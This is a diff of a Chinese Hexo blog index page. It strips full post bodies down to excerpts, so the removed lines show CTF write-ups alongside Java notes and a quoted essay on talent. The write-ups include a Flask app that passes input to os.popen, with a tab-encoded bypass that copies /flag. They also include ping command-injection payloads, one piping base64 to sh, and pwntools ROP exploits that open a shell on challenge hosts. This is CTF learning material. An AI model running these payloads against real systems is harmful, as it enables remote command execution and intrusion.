@@ -330,7 +330,16 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-03-09 13:43:46 / 修改时间：14:35:18" itemprop="dateCreated datePublished" datetime="2025-03-09T13:43:46+08:00">2025-03-09</time>
+      <time title="创建时间：2025-03-09 13:43:46 / 修改时间：14:54:21" itemprop="dateCreated datePublished" datetime="2025-03-09T13:43:46+08:00">2025-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
     </span>
 
   
@@ -354,7 +363,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>492</span>
+      <span>493</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -373,39 +382,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>源码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的库</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid  <span class="comment"># 此导入在代码中未使用，可以考虑移除</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Flask 应用</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的 Web 应用防火墙（WAF）函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    <span class="comment"># 定义黑名单字符</span></span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="comment"># 遍历黑名单字符</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 检查请求参数中是否包含 &quot;Ňśś&quot;</span></span><br><span class="line">    nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> nss:</span><br><span class="line">        <span class="comment"># 调用 WAF 函数检查输入是否合法</span></span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            <span class="comment"># 如果合法，执行系统命令</span></span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果不合法，返回 &quot;waf&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="comment"># 返回 &quot;/source&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /source 路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="comment"># 读取当前文件（app.py）的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        src = f.read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>网上的wp看着云里雾里的，写一个循序渐进版本的</p>
-<p>首先是os.popen(nss),没有read()，没有回显</p>
-<p>所以用&#x2F;source来回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /flag app.py</span><br></pre></td></tr></table></figure>
-
-<p>那么&#x2F;被过滤了，怎么办？</p>
-<p>想到在根目录的时候pwd就是&#x2F;</p>
-<p>所以先回到根目录 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd..&amp;&amp;cd..&lt;不知道多少个&gt;&amp;&amp;cd..</span><br></pre></td></tr></table></figure>
-
-<p>不知道为啥网上的wp是三个点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure>
-
-<p><strong>前一个命令成功后</strong>，才执行下一个</p>
-<p>到根目录了以后可以echo &#x2F;flag了</p>
-<p>把&#x2F;替换为$(pwd)</p>
-<h3 id="pwd-是什么？"><a href="#pwd-是什么？" class="headerlink" title="$(pwd) 是什么？"></a><strong><code>$(pwd)</code> 是什么？</strong></h3><p><code>$(pwd)</code> 是 <strong>命令替换（Command Substitution）</strong> 的一种写法，它的作用是：<br> <strong>执行 <code>pwd</code> 命令，并把它的输出结果替换到当前位置</strong>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(pwd)flag</span><br></pre></td></tr></table></figure>
-
-<p>所以就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(cd .. &amp;&amp;cd .. &lt;不知道多少个&gt;&amp;&amp;cd..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure>
-
-<p>空格全部用%09替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp%09$(cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..&amp;&amp;echo%09$(pwd)flag)%09app.py</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp%09%24(cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag)%09app.py</span><br></pre></td></tr></table></figure>
-
-<p>再访问&#x2F;source<br>成功</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/09/NSSRound-V-Team-PYRCE/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -459,9 +443,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-08 22:49:32 / 修改时间：22:58:43" itemprop="dateCreated datePublished" datetime="2025-03-08T22:49:32+08:00">2025-03-08</time>
+      <time title="创建时间：2025-03-08 22:49:32" itemprop="dateCreated datePublished" datetime="2025-03-08T22:49:32+08:00">2025-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-09 14:54:34" itemprop="dateModified" datetime="2025-03-09T14:54:34+08:00">2025-03-09</time>
     </span>
 
   
@@ -485,7 +475,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>558</span>
+      <span>559</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -504,31 +494,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p><a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-tutorial.html">https://www.runoob.com/java/java-tutorial.html</a></p>
-<p>当你保存一个java文件后</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ javac [-encoding UTF-8] &lt;文件名&gt;.java <span class="comment"># 该命令用于将 java 源文件编译为 class 字节码文件</span></span><br><span class="line">$ java HelloWorld <span class="comment"># java 后面跟着的是java文件中的类名,例如 HelloWorld 就是类名</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Java-基础语法"><a href="#Java-基础语法" class="headerlink" title="Java 基础语法"></a>Java 基础语法</h1><p>一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。下面简要介绍下类、对象、方法和实例变量的概念。</p>
-<ul>
-<li><p><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</p>
-</li>
-<li><p><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。(类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong>)</p>
-</li>
-<li><p><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。(所有的方法名都应该以小写字母开头)</p>
-</li>
-<li><p><strong>实例变量</strong>：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</p>
-</li>
-</ul>
-<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>编写 Java 程序时，应注意以下几点：</p>
-<ul>
-<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
-<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
-<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
-<li><strong>源文件名</strong>：源文件名必须和(主)类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
-<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
-</ul>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/08/Java%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E7%B2%BE%E9%80%89%E9%9B%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -582,9 +555,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-08 21:47:12 / 修改时间：22:35:26" itemprop="dateCreated datePublished" datetime="2025-03-08T21:47:12+08:00">2025-03-08</time>
+      <time title="创建时间：2025-03-08 21:47:12" itemprop="dateCreated datePublished" datetime="2025-03-08T21:47:12+08:00">2025-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-09 14:55:35" itemprop="dateModified" datetime="2025-03-09T14:55:35+08:00">2025-03-09</time>
     </span>
 
   
@@ -608,7 +587,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>131</span>
+      <span>132</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -627,23 +606,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>随便输了个’’直接过滤，好嘛fuzz一下</p>
-<img src="/2025/03/08/GXYCTF2019-Ping-Ping-Ping/QQ20250308-214932.png" class="" title="QQ20250308-214932">
-
-<p>发现管道符没有被过滤</p>
-<img src="/2025/03/08/GXYCTF2019-Ping-Ping-Ping/QQ20250308-215334.png" class="" title="QQ20250308-215334">
-
-<p>我能fuzz中他屏蔽什么  但是我意识不到这个是命令执行  我问师傅 师傅说ping ip ping是个命令 所以能想到命令执行  这种联想只能考重复或者天赋吧</p>
-<img src="/2025/03/08/GXYCTF2019-Ping-Ping-Ping/QQ20250308-223430.png" class="" title="QQ20250308-223430">
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>
-
-<p>cat ‘ls’ 查看当前目录下的所有文件</p>
-<p>其他方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/08/GXYCTF2019-Ping-Ping-Ping/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -812,9 +782,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-07 21:19:22 / 修改时间：21:36:49" itemprop="dateCreated datePublished" datetime="2025-03-07T21:19:22+08:00">2025-03-07</time>
+      <time title="创建时间：2025-03-07 21:19:22" itemprop="dateCreated datePublished" datetime="2025-03-07T21:19:22+08:00">2025-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-09 14:56:03" itemprop="dateModified" datetime="2025-03-09T14:56:03+08:00">2025-03-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -847,7 +823,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>184</span>
+      <span>185</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -866,15 +842,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28542</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x40072C</span>) <span class="comment"># 攻击载荷 A有0X28个（垃圾数据填充） +把地址打包成八字节字符流</span></span><br><span class="line">p.sendline(payload) <span class="comment"># 发送</span></span><br><span class="line"></span><br><span class="line">p.interactive() <span class="comment">#保持交互</span></span><br></pre></td></tr></table></figure>
-
-<p>从纯小白的角度</p>
-<p>只要知道 这段代码下次只要改payload就行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28782)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./r3m4ke1t&#x27;)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line">bin_bash_addr = 0x40093D</span><br><span class="line">pop_rdi = 0x4007e3</span><br><span class="line">ret_addr = 0x40057e</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x20 + 8) + p64(pop_rdi) + p64(bin_bash_addr) + p64(ret_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>checksec一下，64位，无栈溢出保护和PIE保护，直接拖入IDA中，主函数发现有栈溢出点gets(v4)，然后又看到LookAtMe函数中有system(“&#x2F;bin&#x2F;sh”)，直接构造playroad，返回LookAtMe函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(‘node4.anna.nssctf.cn’,28435)</span><br><span class="line">LookAtMe=0x40072C</span><br><span class="line"></span><br><span class="line">payload = b’a’ * (0x20+8) + p64(LookAtMe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/07/NSSCTF-2022-Spring-Recruit-R3m4ke/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -928,9 +903,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-07 21:08:20 / 修改时间：21:34:31" itemprop="dateCreated datePublished" datetime="2025-03-07T21:08:20+08:00">2025-03-07</time>
+      <time title="创建时间：2025-03-07 21:08:20" itemprop="dateCreated datePublished" datetime="2025-03-07T21:08:20+08:00">2025-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-09 14:56:06" itemprop="dateModified" datetime="2025-03-09T14:56:06+08:00">2025-03-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1142,7 +1123,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-07 21:41:11" itemprop="dateModified" datetime="2025-03-07T21:41:11+08:00">2025-03-07</time>
+      <time title="修改时间：2025-03-09 14:56:13" itemprop="dateModified" datetime="2025-03-09T14:56:13+08:00">2025-03-09</time>
     </span>
 
   
@@ -1185,55 +1166,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>答：多看一些超神逆天的人物就习惯了。</p>
-<blockquote>
-<p>作者：老抽<br>链接：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/543642160/answer/2581366617">https://www.zhihu.com/question/543642160/answer/2581366617</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-<p>你真的知道天赋是什么东西吗？</p>
-<p>不是效率，而是感觉。</p>
-<p>不是你做一遍的时间，他能做十遍。</p>
-<p>而是你俩都做了一遍，他甚至可能还比你慢一点，但是他能感觉到窍门，他能获得愉悦，他能爽到，他知道他做对了，他知道下一步是什么。</p>
-<p>而你他妈的做了一千遍一万遍，也没有一丝一毫的滋味。</p>
-<p>反而充满痛苦。</p>
-<p>这才是天赋。</p>
-<p>同样的事情，他不需要任何人教，不需要任何人引导，只需要没有人拦着，他自己就上去了，自己就进步了，而且越来越爽，越来越兴奋。</p>
-<p>而你只能像个瞎子一样，等别人告诉你要做什么，你去做，不断地重复，熟悉，然后等待。你不知道通往下一层楼的楼梯在哪，你不知道它是楼梯还是电梯还是绳梯，最重要的是，你甚至不那么想知道。你只能等别人拉着你，等别人把你抱到二楼，告诉你，继续重复。在这件事情上，你除了重复，做不了任何事情。</p>
-<p>努力会有用，你爬楼甚至比他快，快出很多，他还在一楼，你甚至就已经刷到了五楼。</p>
-<p>但是如果没人告诉你，你他妈这辈子就死在五楼，你不知道一楼到五楼之间的楼梯是什么样子，你不知道五楼上面是什么样子。</p>
-<p>而那个刚刚爬到二楼的人，说扶手的雕花很漂亮，二楼的地板很舒服，他很期待接下来楼梯间墙上的画，和三楼的水晶吊灯。</p>
-<p>努力会有用，天赋也会有用。</p>
-<p>我见过有天赋的人被父母劝着学了别的专业，8年之后，晚上一起散步的时候他说他还是喜欢数学。</p>
-<p>我也见过没什么天赋的人硬靠重复，愣是在刚毕业的某个月拿了1w8的工资。</p>
-<hr>
-<p>有好多人提到了兴趣和天赋。</p>
-<p>换个角度来看天赋</p>
-<p>有些动物的的视觉不能分辨色彩，它们眼中的世界是黑白的，人可以看到色彩，这是天赋。甚至说有些人近视，有些人不近视，那能清晰地看到世界就是天赋。有天赋的人比没天赋的人多一种理解角度或者能更深，更清晰地感受到一种美和秩序。兴奋和动力更来自于自身对这种美的接近和深入理解。</p>
-<p>兴趣是什么？兴趣是看，不管我看到的是黑白还是彩色，近视还是远视，还是说瞎一只眼，我就喜欢看，我只要处在看，观察的状态里，我就高兴。</p>
-<p>兴趣更依托于客观世界，天赋更依托于自身的感受。</p>
-<p>有有兴趣没天赋的，色盲喜欢画画，没味觉的喜欢做饭，对吧，我画出来什么样子我不管，做出来的饭好不好吃我不管，努力的效率低没关系，我只要去做了我就高兴。</p>
-<p>有有天赋没兴趣的，对色彩更敏感，感受更强烈的人，虽然他比别人感受到的东西更多，更强烈，他能领略这种美，但是他不会为研究和接近这样的美而感到自豪，不会因此感到高兴，所以他也不会持续地去做这样的事。</p>
-<p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=499424414&content_type=Answer&match_order=1&q=%E9%BB%91%E9%93%81%E5%9B%9B%E7%8E%A9%E5%AE%B6&zhida_source=entity">黑铁四玩家</a>打了几万场，那是兴趣。新手两个月上<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=499424414&content_type=Answer&match_order=1&q=%E9%9F%A9%E6%9C%8D%E7%8E%8B%E8%80%85&zhida_source=entity">韩服王者</a>，那是天赋。但是那个黑铁四玩家可能一直都很快乐，而那个王者玩家可能只玩了那两个月，再也没碰过这游戏。</p>
-<p>当然，大部分情况下，人们更容易对有天赋的事情产生兴趣。</p>
-<p>如果一件事让你感到快乐和兴奋，你要明白快乐和兴奋来自于哪里，是做这件事本身，还是对这件事背后真理的理解和接近。</p>
-<p>对于普通人来说，能够找到一个兴趣来获得快乐已是不易，如果能有天赋，那真的是很幸运的事情。</p>
-<hr>
-<p>关于老师</p>
-<p>老师更像是眼镜，会帮你把你眼里的世界解析地清楚一点，但你终究是要用自己的身体去体验的，要和客观存在的事物互动的。</p>
-<p>原本你看一块木板是一片黄色，有了眼镜，你能看见木板上有些纹理，但是你去切实地摸那块木板，你摸不到，或者要很长时间才能分辨出来，而且摸到的纹路也不像看上去那么深。你去用斧子劈的时候，那纹理也不那么容易对准，对你劈开它的帮助也不像别人那么大。你知道有纹理，但是对它的理解不够深，自然运用起来也不够准确。</p>
-<p>老师会帮你快一点，好的老师帮你清晰一点，但那未必是天赋，那是buff。当然你还是要比没有老师的人快很多的，结果一般也会高很多。</p>
-<hr>
-<p>评论区有人分析分享自己的天赋，也有人想要寻找自己的天赋，可能我之前的内容有点问题，所以来更新一下。</p>
-<p>天赋是一种感觉。</p>
-<p>所以我们要明白，在某项事情上有出众的成就代表着你的天赋在这项事情上发挥了作用，而不是你的天赋是这项事情。</p>
-<p>还是用眼睛来举例子。</p>
-<p>你的摄影，绘画很棒，总是比别人厉害，更能传递情感，更能让人感到惊艳。这个事实用“我在绘画或者摄影上有天赋”来解释是相当模糊的。</p>
-<p>因为绘画并不是一种感觉。</p>
-<p>你身上可以称为天赋的东西可以是色彩感觉，可以是明暗感觉，可以是形状感知，可以是距离感知，也可以是情感的感知上更细腻，甚至可能只是你的视力比别人好，别人只能看到一面白墙，你可以看到墙面上的纹路，肌理。</p>
-<p>总之，你的天赋可以帮你获得更多或者更细或者更深层次的信息，这些信息帮助你在做事情的时候发挥得更好。</p>
-<p>这些话有什么用呢？</p>
-<p>如果你对自己的认知是“我对气味更敏感”，而不是“我在种花上有天赋”，那么你可以在种花之外多进行一些尝试，你可以试着酿酒、当厨师、做香水、甚至是做化工产品。在有限的生命和有限的个人发展条件下，可以多一些出路和选择。</p>
-<p>寻找自己的天赋和兴趣是人的本能，在这个过程中，必然会有意无意地大量尝试，有这样的认知可能会帮你更快地确定自己的天赋，也更容易把天赋和兴趣结合起来。</p>
-<p>最后呢，我个人认为在进行自我评价时，“我的某种感觉很敏锐”比“我做某件事比别人厉害”要更谦逊，更平和一点，不那么容易变得自大，不那么容易产生我的优势是理所应当的想法。</p>
-</blockquote>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/03/06/%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E8%A7%A3%E5%86%B3Peer-Pressure/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
